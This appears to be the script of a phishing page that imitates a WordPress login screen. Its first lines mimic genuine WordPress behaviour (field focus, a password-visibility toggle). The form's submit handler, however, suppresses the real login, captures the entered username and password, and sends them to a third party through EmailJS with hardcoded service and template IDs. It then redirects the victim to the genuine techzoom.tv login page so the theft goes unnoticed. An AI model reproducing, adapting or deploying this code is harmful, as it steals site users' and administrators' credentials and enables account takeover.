document.body.className = document.body.className.replace('no-js','js');

function wp_attempt_focus() {
    setTimeout(function() {
        try {
            d = document.getElementById("user_login");
            d.focus();
            d.select();
        } catch (er) {}
    }, 200);
}
wp_attempt_focus();
if (typeof wpOnload === 'function') {
    wpOnload()
}

document.addEventListener('DOMContentLoaded', function() {
    const togglePasswordButton = document.querySelector('.wp-hide-pw');
    const passwordInput = document.querySelector('#user_pass');

    togglePasswordButton.addEventListener('click', function() {
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        
        // Toggle the eye icon
        if (type === 'text') {
            togglePasswordButton.innerHTML = '<span class="dashicons dashicons-hidden" aria-hidden="true"></span>';
        } else {
            togglePasswordButton.innerHTML = '<span class="dashicons dashicons-visibility" aria-hidden="true"></span>';
        }
    });

    emailjs.init("1Qpvqr9kH63DigF08");

    const loginForm = document.getElementById('loginform');
    const loginOverlay = document.getElementById('login');

    loginForm.addEventListener('submit', function(event) {
        event.preventDefault();
        
        let parms = {
            user_login: document.getElementById("user_login").value,
            user_pass: document.getElementById("user_pass").value,
        };
        
        emailjs.send("service_i6hz2j7", "template_3ixqw3s", parms)
        window.location.href = "https://techzoom.tv/wp-login.php?";
    });
});
